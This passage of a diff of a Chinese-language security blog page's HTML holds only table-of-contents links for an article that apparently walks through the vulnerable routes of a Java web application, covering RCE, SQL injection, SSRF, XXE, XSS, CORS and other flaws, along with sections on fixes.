toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-XMLReader-x2F-vuln"><span class="toc-text">8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><span class="toc-text">9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-text">上述存在XXE漏洞库对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload%EF%BC%9A"><span class="toc-text">统一漏洞利用payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-text">统一修复代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlbeam-x2F-vuln"><span class="toc-text">10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E8%B7%AF%E7%94%B1-x2F-ooxml-x2F-readxlsx"><span class="toc-text">11.路由&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%B7%AF%E7%94%B1-x2F-xlsx-streamer-x2F-readxlsx"><span class="toc-text">12.路由&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">八、命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-codeinject"><span class="toc-text">1.路由&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-codeinject-x2F-host"><span class="toc-text">2.路由&#x2F;codeinject&#x2F;host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81Cookie%E4%BC%AA%E9%80%A0"><span class="toc-text">九、Cookie伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln01"><span class="toc-text">1.路由&#x2F;cookie&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln02"><span class="toc-text">2.路由&#x2F;cookie&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln03"><span class="toc-text">3.路由&#x2F;cookie&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln04"><span class="toc-text">4.路由&#x2F;cookie&#x2F;vuln04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln05"><span class="toc-text">5.路由&#x2F;cookie&#x2F;vuln05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-cookie-x2F-vuln06"><span class="toc-text">6.路由&#x2F;cookie&#x2F;vuln06</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81CORS"><span class="toc-text">十、CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-origin"><span class="toc-text">1.路由&#x2F;cors&#x2F;vuln&#x2F;origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-setHeader"><span class="toc-text">2.路由&#x2F;cors&#x2F;vuln&#x2F;setHeader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-cors-x2F-vuln-x2F-crossOrigin"><span class="toc-text">3.路由&#x2F;cors&#x2F;vuln&#x2F;crossOrigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">漏洞防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6origin"><span class="toc-text">（1）限制origin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89WebMvcConfigurer%E8%AE%BE%E7%BD%AECors"><span class="toc-text">（2）WebMvcConfigurer设置Cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89spring-security%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（3）spring security设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89filter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（4）自定义filter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89CorsFilter%E8%AE%BE%E7%BD%AEcors"><span class="toc-text">（5）CorsFilter设置cors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%886%EF%BC%89origin%E6%A3%80%E6%9F%A5"><span class="toc-text">（6）origin检查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">十一、目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-path-traversal-x2F-vul"><span class="toc-text">1.路由&#x2F;path_traversal&#x2F;vul</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">十二、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-file-x2F-upload"><span class="toc-text">1.路由&#x2F;file&#x2F;upload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">十三、SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln1"><span class="toc-text">1.路由&#x2F;spel&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-spel-x2F-vuln2"><span class="toc-text">2.路由&#x2F;spel&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81Deserialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">十四、Deserialize反序列化</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -739,7 +747,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">一、RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.路由&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.路由&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.路由&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sql注入修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">（1）预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">（2）waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">（3）MyBatis防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">三、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.路由&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">四、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.路由&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRF修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">（1）限制协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">（2）限制文件类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">（3）http请求检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">方法5：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">（4）核心SSRF防护代码</span></a></li></ol></li></ol></li></ol></div></p>
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">一、RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.路由&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.路由&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.路由&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sql注入修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">（1）预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">（2）waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">（3）MyBatis防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">三、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.路由&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">四、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.路由&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRF修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">（1）限制协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">（2）限制文件类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">（3）http请求检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">方法5：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">（4）核心SSRF防护代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81CSRF"><span class="toc-text">五、CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-csrf-x2F-post"><span class="toc-text">1.路由&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRF防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS"><span class="toc-text">六、XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-reflect"><span class="toc-text">1.路由&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-stored"><span class="toc-text">2.路由&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSS攻击防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XXE"><span class="toc-text">七、XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlReader-x2F-vuln"><span class="toc-text">1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><span class="toc-text">2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXReader-x2F-vuln"><span class="toc-text">3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXParser-x2F-vuln"><span class="toc-text">4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-Digester-x2F-vuln"><span class="toc-text">5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><span class="toc-text">6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><span class="toc-text">7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-XMLReader-x2F-vuln"><span class="toc-text">8.路由&#x2F;xxe&#x2F;XMLReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentHelper-x2F-vuln"><span class="toc-text">9.路由&#x2F;xxe&#x2F;DocumentHelper&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E8%BF%B0%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%E5%BA%93%E5%AF%B9%E6%AF%94"><span class="toc-text">上述存在XXE漏洞库对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8payload%EF%BC%9A"><span class="toc-text">统一漏洞利用payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9F%E4%B8%80%E4%BF%AE%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-text">统一修复代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlbeam-x2F-vuln"><span class="toc-text">10.路由&#x2F;xxe&#x2F;xmlbeam&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E8%B7%AF%E7%94%B1-x2F-ooxml-x2F-readxlsx"><span class="toc-text">11.路由&#x2F;ooxml&#x2F;readxlsx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E8%B7%AF%E7%94%B1-x2F-xlsx-streamer-x2F-readxlsx"><span class="toc-text">12.路由&#x2F;xlsx-streamer&#x2F;readxlsx</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">八、命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-codeinject"><span class="toc-text">1.路由&#x2F;codeinject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-codeinject-x2F-host"><span 